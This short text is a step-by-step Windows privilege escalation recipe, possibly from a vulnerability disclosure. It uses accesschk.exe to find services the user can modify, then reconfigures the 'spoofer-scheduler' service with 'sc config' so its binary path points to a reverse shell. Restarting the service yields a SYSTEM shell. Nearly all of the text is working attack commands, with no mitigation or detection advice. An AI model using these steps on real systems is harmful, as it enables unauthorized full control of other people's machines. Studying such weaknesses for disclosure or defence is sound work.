With the accesschk.exe program, which is part of the Sysinternals Suite, run the following command:
accesschk.exe /accepteula -uwcqv "YOUR_USERNAME" *
Then, for the service(s) you have modification access to as your user, you can change the service path to point to a reverse shell. This will allow you to get a shell running as NT AUTHORITY\SYSTEM.
Next, enter the following command:
sc config spoofer-scheduler binpath="PATH_TO_YOUR_REVERSE_SHELL"
Finally, restart the service either by rebooting the computer or manually through the Services application. You will then 
receive a shell with NT AUTHORITY\SYSTEM privileges.
